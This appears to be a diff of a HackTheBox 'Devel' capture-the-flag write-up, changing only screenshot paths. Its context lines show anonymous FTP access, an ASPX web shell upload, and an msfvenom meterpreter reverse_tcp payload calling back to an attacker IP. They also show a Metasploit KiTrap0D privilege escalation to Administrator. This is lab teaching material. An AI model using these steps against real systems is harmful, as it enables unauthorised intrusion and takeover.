@@ -40,7 +40,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.10.10.5
 ```
 
-![ping](cases/HackTheBox/Machines/EASY/Devel/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -60,7 +60,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.5 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![allports](cases/HackTheBox/Machines/EASY/Devel/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -68,7 +68,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/Devel/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -83,7 +83,7 @@ nmap -p21,80 -sC -sV 10.10.10.5 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-![targeted](cases/HackTheBox/Machines/EASY/Devel/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -114,7 +114,7 @@ The FTP service is open, so we attempt to log in using `anonymous` credentials w
 ftp 10.10.10.5
 ```
 
-![ftp](cases/HackTheBox/Machines/EASY/Devel/screenshots/ftp.png)
+![ftp](screenshots/ftp.png)
 
 We successfully log in and can list resources. To check if file uploads are allowed, we create and upload a test file:
 
@@ -122,7 +122,7 @@ We successfully log in and can list resources. To check if file uploads are allo
 put test.txt
 ```
 
-![ftp_upload_test](cases/HackTheBox/Machines/EASY/Devel/screenshots/ftp_upload_test.png)
+![ftp_upload_test](screenshots/ftp_upload_test.png)
 
 The file uploads successfully, confirming we can place files in the webroot.
 
@@ -138,7 +138,7 @@ put cmdasp.aspx
 whoami
 ```
 
-![ftp_upload_shell](cases/HackTheBox/Machines/EASY/Devel/screenshots/ftp_upload_shell.png)
+![ftp_upload_shell](screenshots/ftp_upload_shell.png)
 
 We obtain remote command execution as user `iis apppool\web`.
 
@@ -151,7 +151,7 @@ Check system details:
 systeminfo
 ```
 
-![webshell_sysinfo](cases/HackTheBox/Machines/EASY/Devel/screenshots/webshell_sysinfo.png)
+![webshell_sysinfo](screenshots/webshell_sysinfo.png)
 
 List users:
 
@@ -159,7 +159,7 @@ List users:
 dir C:\Users
 ```
 
-![webshell_users](cases/HackTheBox/Machines/EASY/Devel/screenshots/webshell_users.png)
+![webshell_users](screenshots/webshell_users.png)
 
 Check contents of `babis`:
 
@@ -167,7 +167,7 @@ Check contents of `babis`:
 dir C:\Users\babis
 ```
 
-![webshell_babis](cases/HackTheBox/Machines/EASY/Devel/screenshots/webshell_babis.png)
+![webshell_babis](screenshots/webshell_babis.png)
 
 No useful information found.
 
@@ -182,7 +182,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=443 -f aspx -
 
 Upload the file via FTP:
 
-![metasploit_aspx_webshell](cases/HackTheBox/Machines/EASY/Devel/screenshots/metasploit_aspx_webshell.png)
+![metasploit_aspx_webshell](screenshots/metasploit_aspx_webshell.png)
 
 Set up a listener with Metasploit:
 
@@ -197,11 +197,11 @@ run
 
 Trigger the reverse shell by browsing to the uploaded payload:
 
-![webshell_url](cases/HackTheBox/Machines/EASY/Devel/screenshots/webshell_url.png)
+![webshell_url](screenshots/webshell_url.png)
 
 Shell obtained:
 
-![shell_obtained](cases/HackTheBox/Machines/EASY/Devel/screenshots/shell_obtained.png)
+![shell_obtained](screenshots/shell_obtained.png)
 
 Verify:
 
@@ -210,7 +210,7 @@ sysinfo
 whoami /priv
 ```
 
-![shell_info](cases/HackTheBox/Machines/EASY/Devel/screenshots/shell_info.png)
+![shell_info](screenshots/shell_info.png)
 
 ---
 ## 4. Privilege Escalation
@@ -228,7 +228,7 @@ Search for privilege escalation exploits:
 search exploit/windows/local/ms10_015
 ```
 
-![exploit_kitrap0d](cases/HackTheBox/Machines/EASY/Devel/screenshots/exploit_kitrap0d.png)
+![exploit_kitrap0d](screenshots/exploit_kitrap0d.png)
 
 Select and configure **KiTrap0D**. Exectue the shell in background session:
 
@@ -240,11 +240,11 @@ set session 1
 exploit
 ```
 
-![exploit_run](cases/HackTheBox/Machines/EASY/Devel/screenshots/exploit_run.png)
+![exploit_run](screenshots/exploit_run.png)
 
 We escalate successfully to Administrator:
 
-![root_user_flag](cases/HackTheBox/Machines/EASY/Devel/screenshots/root_user_flag.png)
+![root_user_flag](screenshots/root_user_flag.png)
 
 ---
 ## 5. Post-Exploitation
